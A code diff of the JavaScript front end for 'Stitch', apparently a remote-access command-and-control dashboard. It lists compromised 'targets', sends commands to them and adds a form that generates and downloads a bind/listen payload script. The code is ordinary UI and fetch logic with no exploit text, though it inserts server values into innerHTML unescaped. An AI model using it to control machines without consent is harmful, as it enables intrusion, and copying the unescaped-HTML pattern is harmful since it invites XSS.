@@ -1,6 +1,7 @@
 // Stitch Real-Time Interface - JavaScript
 let socket;
 let selectedConnection = null;
+let commandDefinitions = {}; // Store command definitions from backend
 
 // Command history for arrow key navigation
 let commandHistory = [];
@@ -75,10 +76,32 @@ function getCSRFToken() {
     return metaTag ? metaTag.getAttribute('content') : '';
 }
 
+// Load command definitions from backend
+async function loadCommandDefinitions() {
+    try {
+        const response = await fetch('/api/command_definitions', {
+            headers: {
+                'X-CSRFToken': getCSRFToken()
+            }
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            commandDefinitions = data.definitions;
+            console.log('Command definitions loaded:', Object.keys(commandDefinitions).length, 'commands');
+        } else {
+            console.error('Failed to load command definitions:', response.status);
+        }
+    } catch (error) {
+        console.error('Error loading command definitions:', error);
+    }
+}
+
 // Initialize
 document.addEventListener('DOMContentLoaded', () => {
     initializeWebSocket();
     initializeNavigation();
+    loadCommandDefinitions();
     loadInitialData();
     startAutoRefresh();
     initializeCommandHistory();
@@ -103,6 +126,14 @@ function initializeWebSocket() {
     
     socket.on('debug_log', (log) => {
         appendLog(log);
+    });
+    
+    socket.on('connection_update', (data) => {
+        updateConnectionStatus(data);
+    });
+    
+    socket.on('connection_status_change', (data) => {
+        updateIndividualConnectionStatus(data);
     });
     
     socket.on('connection_update', (data) => {
@@ -297,15 +328,24 @@ async function loadConnections() {
             
             return `
                 <div class="connection-card ${statusClass} ${selectedClass}" 
+                     data-connection-id="${conn.id}"
                      onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}')">
-                    <h3>${conn.hostname}</h3>
+                    <div class="connection-header">
+                        <div class="connection-status-indicator">
+                            <h3>${conn.hostname}</h3>
+                            <div class="connection-pulse ${conn.status}"></div>
+                        </div>
+                        <div class="connection-status">
+                            <span class="status-dot ${conn.status}"></span>
+                            <span class="status-text ${conn.status}">${conn.status.toUpperCase()}</span>
+                        </div>
+                    </div>
                     <div class="connection-info">
                         <p><strong>IP:</strong> ${conn.target}</p>
                         <p><strong>User:</strong> ${conn.user}</p>
                         <p><strong>OS:</strong> ${conn.os}</p>
                         <p><strong>Port:</strong> ${conn.port}</p>
-                        <p><strong>Status:</strong> ${conn.status.toUpperCase()}</p>
-                        ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> ${lastSeen}</p>` : ''}
+                        ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> <span class="last-seen">${lastSeen}</span></p>` : ''}
                         ${conn.status === 'online' ? `<p><strong>Connected:</strong> ${connectedAt}</p>` : ''}
                     </div>
                     ${quickActions}
@@ -329,22 +369,31 @@ function selectConnection(id, hostname, status) {
     // Update UI
     loadConnections(); // Refresh to show selection
     
-    // Update command section info
+    updateSelectedConnectionInfo();
+}
+
+function updateSelectedConnectionInfo() {
     const infoDiv = document.getElementById('selectedConnectionInfo');
-    if (status === 'online') {
-        infoDiv.innerHTML = `
-            <strong>✅ Selected Target:</strong> ${hostname} (${id}) - ONLINE<br>
-            <em>Ready for command execution - Switch to Commands tab</em>
-        `;
-        infoDiv.style.borderColor = 'var(--success)';
-        showToast(`✓ Target selected: ${hostname} - Ready for commands`, 'success');
-    } else {
-        infoDiv.innerHTML = `
-            <strong>⚫ Selected Target:</strong> ${hostname} (${id}) - OFFLINE<br>
-            <em>⚠️ This connection is offline. Commands cannot be executed.</em>
-        `;
-        infoDiv.style.borderColor = 'var(--warning)';
-        showToast(`⚠️ ${hostname} is offline - Cannot execute commands`, 'warning');
+    if (infoDiv && selectedConnection) {
+        const { id, hostname, status } = selectedConnection;
+        const statusIcon = status === 'online' ? '✅' : status === 'idle' ? '🟡' : status === 'stale' ? '⚪' : '⚫';
+        const statusColor = status === 'online' ? 'var(--success)' : status === 'offline' ? 'var(--danger)' : 'var(--warning)';
+        
+        if (status === 'online') {
+            infoDiv.innerHTML = `
+                <strong>${statusIcon} Selected Target:</strong> ${hostname} (${id}) - <span style="color: ${statusColor}; font-weight: bold;">${status.toUpperCase()}</span><br>
+                <em>Ready for command execution - Switch to Commands tab</em>
+            `;
+            infoDiv.style.borderColor = 'var(--success)';
+            showToast(`✓ Target selected: ${hostname} - Ready for commands`, 'success');
+        } else {
+            infoDiv.innerHTML = `
+                <strong>${statusIcon} Selected Target:</strong> ${hostname} (${id}) - <span style="color: ${statusColor}; font-weight: bold;">${status.toUpperCase()}</span><br>
+                <em>⚠️ This connection is ${status}. Commands may not execute properly.</em>
+            `;
+            infoDiv.style.borderColor = statusColor;
+            showToast(`⚠️ ${hostname} is ${status} - Commands may fail`, 'warning');
+        }
     }
     
     // Update persistent target indicator in nav
@@ -427,9 +476,38 @@ async function executeCommand(command) {
 }
 
 function executeCommandWithParam(command) {
+    if (!selectedConnection) {
+        showToast('Please select a connection first', 'error');
+        return;
+    }
+    
+    // Check if we have command definitions for this command
+    const cmdParts = command.split(' ');
+    const cmdName = cmdParts[0];
+    const subCommand = cmdParts[1];
+    
+    if (commandDefinitions[cmdName]) {
+        const cmdDef = commandDefinitions[cmdName];
+        
+        // Handle subcommands
+        if (subCommand && cmdDef.subcommands && cmdDef.subcommands[subCommand]) {
+            const subCmdDef = cmdDef.subcommands[subCommand];
+            if (subCmdDef.parameters && subCmdDef.parameters.length > 0) {
+                showInteractiveCommandForm(command, subCmdDef);
+                return;
+            }
+        } 
+        // Handle direct command parameters
+        else if (cmdDef.parameters && cmdDef.parameters.length > 0) {
+            showInteractiveCommandForm(command, cmdDef);
+            return;
+        }
+    }
+    
+    // Fallback to simple prompt for unknown commands
     const param = prompt(`Enter parameter for ${command}:`);
-    if (param) {
-        executeCommand(`${command} ${param}`);
+    if (param !== null && param.trim() !== '') {
+        executeCommand(`${command} ${param.trim()}`);
     }
 }
 
@@ -478,6 +556,132 @@ function executeCustomCommand() {
         input.value = '';
     } else {
         showToast('Invalid command format', 'warning');
+    }
+}
+
+// Show interactive command form based on command definitions
+function showInteractiveCommandForm(command, cmdDef) {
+    const modal = document.createElement('div');
+    modal.className = 'command-modal';
+    modal.innerHTML = `
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>🔧 ${command.toUpperCase()} Command</h3>
+                <button class="modal-close" onclick="closeCommandModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form id="commandForm">
+                    ${cmdDef.parameters.map(param => `
+                        <div class="form-group">
+                            <label for="param_${param.name}">${param.prompt}:</label>
+                            ${param.type === 'select' ? `
+                                <select id="param_${param.name}" name="${param.name}" ${param.required ? 'required' : ''}>
+                                    ${param.options.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
+                                </select>
+                            ` : param.type === 'number' ? `
+                                <input type="number" id="param_${param.name}" name="${param.name}" 
+                                       placeholder="${param.placeholder || ''}" ${param.required ? 'required' : ''}>
+                            ` : `
+                                <input type="text" id="param_${param.name}" name="${param.name}" 
+                                       placeholder="${param.placeholder || ''}" ${param.required ? 'required' : ''}>
+                            `}
+                        </div>
+                    `).join('')}
+                    ${cmdDef.confirmation ? `
+                        <div class="form-group confirmation-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" id="confirmExecution" required>
+                                <span class="checkmark"></span>
+                                I understand the risks and want to execute this command
+                            </label>
+                        </div>
+                    ` : ''}
+                    ${cmdDef.dangerous ? `
+                        <div class="warning-box">
+                            <strong>⚠️ WARNING:</strong> This is a potentially dangerous command that may cause system damage or data loss.
+                        </div>
+                    ` : ''}
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button class="cmd-btn" onclick="submitCommandForm('${command}')">Execute Command</button>
+                <button class="clear-btn" onclick="closeCommandModal()">Cancel</button>
+            </div>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    // Focus first input
+    const firstInput = modal.querySelector('input, select');
+    if (firstInput) firstInput.focus();
+}
+
+function closeCommandModal() {
+    const modal = document.querySelector('.command-modal');
+    if (modal) {
+        modal.remove();
+    }
+}
+
+function submitCommandForm(baseCommand) {
+    const form = document.getElementById('commandForm');
+    const formData = new FormData(form);
+    const parameters = {};
+    
+    // Collect all parameters
+    for (let [key, value] of formData.entries()) {
+        if (key !== 'confirmExecution') {
+            parameters[key] = value;
+        }
+    }
+    
+    closeCommandModal();
+    
+    // Execute the command with parameters
+    executeCommandWithParameters(baseCommand, parameters);
+}
+
+// Execute command with structured parameters
+async function executeCommandWithParameters(command, parameters) {
+    if (!selectedConnection) {
+        showToast('Please select a connection first', 'error');
+        return;
+    }
+    
+    // Show loading state
+    const outputElement = document.getElementById('commandOutput');
+    outputElement.textContent = `⏳ Executing ${command}...`;
+    
+    try {
+        const response = await fetch('/api/execute', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCSRFToken()
+            },
+            body: JSON.stringify({
+                connection_id: selectedConnection.id,
+                command: command,
+                parameters: parameters
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            outputElement.textContent = result.output;
+            showToast('Command executed successfully', 'success');
+            
+            // Add to command history
+            addToCommandHistory(command);
+        } else {
+            outputElement.textContent = `❌ Error: ${result.error}`;
+            showToast(`Command failed: ${result.error}`, 'error');
+        }
+    } catch (error) {
+        outputElement.textContent = `❌ Network error: ${error.message}`;
+        showToast('Network error occurred', 'error');
     }
 }
 
@@ -643,7 +847,88 @@ function startAutoRefresh() {
         } else if (activeSection === 'logs-section') {
             loadLogs();
         }
-    }, 5000); // Refresh every 5 seconds
+    }, 30000); // Reduced to 30 seconds due to real-time updates
+}
+
+// Real-time connection status updates
+function updateConnectionStatus(data) {
+    // Update active connection count in real-time
+    const activeCountElement = document.getElementById('activeCount');
+    if (activeCountElement && data.active_connections !== undefined) {
+        activeCountElement.textContent = data.active_connections;
+        
+        // Add visual feedback for changes
+        activeCountElement.style.transform = 'scale(1.1)';
+        activeCountElement.style.color = 'var(--primary)';
+        setTimeout(() => {
+            activeCountElement.style.transform = 'scale(1)';
+            activeCountElement.style.color = '';
+        }, 300);
+    }
+    
+    // Show toast notification for connection changes
+    if (data.active_connections !== undefined) {
+        const message = `Active connections: ${data.active_connections}`;
+        showToast(message, 'info', 2000);
+    }
+}
+
+function updateIndividualConnectionStatus(data) {
+    const { connection_id, status, last_seen } = data;
+    
+    // Update connection card if it exists
+    const connectionCard = document.querySelector(`[data-connection-id="${connection_id}"]`);
+    if (connectionCard) {
+        const statusElement = connectionCard.querySelector('.connection-status');
+        const statusIndicator = connectionCard.querySelector('.status-dot');
+        const lastSeenElement = connectionCard.querySelector('.last-seen');
+        
+        if (statusElement) {
+            statusElement.textContent = status.toUpperCase();
+            statusElement.className = `connection-status ${status}`;
+        }
+        
+        if (statusIndicator) {
+            statusIndicator.className = `status-dot ${status}`;
+            
+            // Add pulse animation for status changes
+            statusIndicator.style.animation = 'none';
+            setTimeout(() => {
+                statusIndicator.style.animation = '';
+            }, 10);
+        }
+        
+        if (lastSeenElement && last_seen) {
+            lastSeenElement.textContent = `Last seen: ${formatTimestamp(last_seen)}`;
+        }
+        
+        // Add visual feedback for status changes
+        connectionCard.style.transform = 'scale(1.02)';
+        connectionCard.style.boxShadow = '0 0 20px rgba(0, 217, 255, 0.3)';
+        setTimeout(() => {
+            connectionCard.style.transform = '';
+            connectionCard.style.boxShadow = '';
+        }, 500);
+    }
+    
+    // Update selected connection if it matches
+    if (selectedConnection && selectedConnection.id === connection_id) {
+        selectedConnection.status = status;
+        selectedConnection.last_seen = last_seen;
+        updateSelectedConnectionInfo();
+    }
+    
+    // Show status change notification
+    const statusMessages = {
+        'online': '🟢 Connection established',
+        'offline': '🔴 Connection lost',
+        'idle': '🟡 Connection idle',
+        'stale': '⚪ Connection stale'
+    };
+    
+    const message = `${connection_id}: ${statusMessages[status] || status}`;
+    const toastType = status === 'online' ? 'success' : status === 'offline' ? 'error' : 'warning';
+    showToast(message, toastType, 3000);
 }
 
 // Toast Notifications
@@ -1029,4 +1314,139 @@ function updateTargetIndicator(hostname, status) {
         <div class="indicator-label">ACTIVE TARGET</div>
         <div class="indicator-value">${statusIcon} ${hostname}</div>
     `;
+}
+
+// Payload Generation Functions
+async function generatePayload() {
+    const form = document.getElementById('payloadForm');
+    const outputDiv = document.getElementById('payloadOutput');
+    const infoDiv = document.getElementById('payloadInfo');
+    
+    // Get form data
+    const enableBind = document.getElementById('enableBind').checked;
+    const bindHost = document.getElementById('bindHost').value.trim();
+    const bindPort = document.getElementById('bindPort').value;
+    const enableListen = document.getElementById('enableListen').checked;
+    const listenHost = document.getElementById('listenHost').value.trim();
+    const listenPort = document.getElementById('listenPort').value;
+    
+    // Validation
+    if (!enableBind && !enableListen) {
+        showToast('At least one mode (Bind or Listen) must be enabled', 'error');
+        return;
+    }
+    
+    // Show loading
+    infoDiv.innerHTML = '<div class="loading-spinner"></div><p>Generating payload...</p>';
+    outputDiv.style.display = 'block';
+    
+    try {
+        const response = await fetch('/api/generate-payload', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCSRFToken()
+            },
+            body: JSON.stringify({
+                enable_bind: enableBind,
+                bind_host: bindHost,
+                bind_port: parseInt(bindPort),
+                enable_listen: enableListen,
+                listen_host: listenHost,
+                listen_port: parseInt(listenPort)
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            infoDiv.innerHTML = `
+                <div class="success-box">
+                    <h4>✅ Payload Generated Successfully</h4>
+                    <p><strong>Size:</strong> ${formatBytes(result.payload_size)}</p>
+                    <p><strong>Configuration:</strong></p>
+                    <ul>
+                        ${result.config.enable_bind ? `<li>Bind: ${result.config.bind_host || 'any'}:${result.config.bind_port}</li>` : ''}
+                        ${result.config.enable_listen ? `<li>Listen: ${result.config.listen_host}:${result.config.listen_port}</li>` : ''}
+                    </ul>
+                </div>
+            `;
+            showToast('Payload generated successfully!', 'success');
+        } else {
+            infoDiv.innerHTML = `
+                <div class="error-box">
+                    <h4>❌ Generation Failed</h4>
+                    <p>${result.error}</p>
+                </div>
+            `;
+            showToast(`Generation failed: ${result.error}`, 'error');
+        }
+    } catch (error) {
+        infoDiv.innerHTML = `
+            <div class="error-box">
+                <h4>❌ Network Error</h4>
+                <p>${error.message}</p>
+            </div>
+        `;
+        showToast('Network error during generation', 'error');
+    }
+}
+
+async function downloadPayload() {
+    try {
+        const response = await fetch('/api/download-payload', {
+            headers: {
+                'X-CSRFToken': getCSRFToken()
+            }
+        });
+        
+        if (response.ok) {
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'stitch_payload.py';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+            
+            showToast('Payload downloaded successfully', 'success');
+        } else {
+            const error = await response.json();
+            showToast(`Download failed: ${error.error}`, 'error');
+        }
+    } catch (error) {
+        showToast('Download error occurred', 'error');
+    }
+}
+
+function resetPayloadForm() {
+    document.getElementById('enableBind').checked = true;
+    document.getElementById('bindHost').value = '';
+    document.getElementById('bindPort').value = '4433';
+    document.getElementById('enableListen').checked = true;
+    document.getElementById('listenHost').value = 'localhost';
+    document.getElementById('listenPort').value = '4455';
+    document.getElementById('payloadOutput').style.display = 'none';
+}
+
+function copyPayloadInfo() {
+    const infoDiv = document.getElementById('payloadInfo');
+    const text = infoDiv.textContent || infoDiv.innerText;
+    
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Payload info copied to clipboard', 'success');
+        });
+    } else {
+        // Fallback for older browsers
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        showToast('Payload info copied to clipboard', 'success');
+    }
 }
